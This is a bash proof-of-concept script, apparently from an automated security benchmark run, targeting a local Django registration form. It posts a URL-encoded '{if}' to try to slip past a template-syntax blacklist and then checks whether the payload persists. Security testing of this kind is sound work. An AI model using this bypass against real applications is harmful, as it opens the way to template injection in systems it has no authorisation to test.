#!/bin/bash
# POC: Demonstrates input validation bypass via URL encoding on the registration name field. Shows that blacklist validation can be bypassed by URL-encoding blocked characters like {if} to %7Bif%7D.
# Target: ./repo
# Created: 2025-12-02T16:20:55.504Z
# Session: benchmark-XBEN-056-24-miorxlcr

# Input Validation Bypass via URL Encoding POC
# Demonstrates bypassing Django template syntax blacklist by URL-encoding blocked characters

TARGET_URL="http://localhost:8000/accounts/register/step1/"
CSRF_URL="http://localhost:8000/accounts/register/step1/"

echo "[*] Input Validation Bypass via URL Encoding - Name Field POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Get initial CSRF token
echo "[*] Step 1: Fetching CSRF token from registration page..."
CSRF_RESPONSE=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt "$CSRF_URL")
CSRF_TOKEN=$(echo "$CSRF_RESPONSE" | grep -oP 'csrfmiddlewaretoken.*?value="\K[^"]+' | head -1)

if [ -z "$CSRF_TOKEN" ]; then
  echo "[-] Failed to extract CSRF token"
  exit 1
fi

echo "[+] CSRF Token obtained: ${CSRF_TOKEN:0:20}..."
echo ""

# Step 2: Test with literal {if} - should be blocked
echo "[*] Step 2: Testing with literal {if} (should be blocked)..."
LITERAL_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "csrfmiddlewaretoken=$CSRF_TOKEN&name={if}&email=test@example.com" \
  "$TARGET_URL")

LITERAL_STATUS=$(echo "$LITERAL_RESPONSE" | tail -1)
echo "Response Status: $LITERAL_STATUS"

if [ "$LITERAL_STATUS" = "200" ]; then
  echo "[!] WARNING: Literal {if} was accepted (unexpected)"
else
  echo "[+] Literal {if} was rejected as expected (Status: $LITERAL_STATUS)"
fi
echo ""

# Step 3: Refresh CSRF token for next attempt
echo "[*] Step 3: Fetching fresh CSRF token for URL-encoded bypass test..."
CSRF_RESPONSE=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt "$CSRF_URL")
CSRF_TOKEN=$(echo "$CSRF_RESPONSE" | grep -oP 'csrfmiddlewaretoken.*?value="\K[^"]+' | head -1)
echo "[+] Fresh CSRF Token obtained: ${CSRF_TOKEN:0:20}..."
echo ""

# Step 4: Test with URL-encoded %7Bif%7D - should bypass validation
echo "[*] Step 4: Testing with URL-encoded %7Bif%7D (bypass attempt)..."
ENCODED_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "csrfmiddlewaretoken=$CSRF_TOKEN&name=%7Bif%7D&email=test2@example.com" \
  "$TARGET_URL")

ENCODED_STATUS=$(echo "$ENCODED_RESPONSE" | tail -1)
ENCODED_BODY=$(echo "$ENCODED_RESPONSE" | head -n -1)

echo "Response Status: $ENCODED_STATUS"

if [ "$ENCODED_STATUS" = "302" ] || [ "$ENCODED_STATUS" = "200" ]; then
  echo "[+] URL-encoded %7Bif%7D ACCEPTED - Validation bypass successful!"
  echo "[+] This indicates the validation does NOT decode before checking"
  
  # Try to access step 3 to confirm payload persists
  echo ""
  echo "[*] Step 5: Checking if bypassed payload appears on step 3..."
  
  STEP3_RESPONSE=$(curl -s -b /tmp/cookies.txt "http://localhost:8000/accounts/register/step3/")
  
  if echo "$STEP3_RESPONSE" | grep -q "{if}"; then
    echo "[+] VULNERABILITY CONFIRMED: Bypassed payload {if} appears on step 3"
    echo "[+] Found in: $(echo "$STEP3_RESPONSE" | grep -o "[^[:space:]]*{if}[^[:space:]]*" | head -1)"
  else
    echo "[!] URL-encoded payload accepted but not found on step 3 (may be cleaned up)"
  fi
else
  echo "[-] URL-encoded payload was also blocked (Status: $ENCODED_STATUS)"
  echo "[-] Validation may already handle encoded input properly"
fi

echo ""
echo "[*] POC Complete"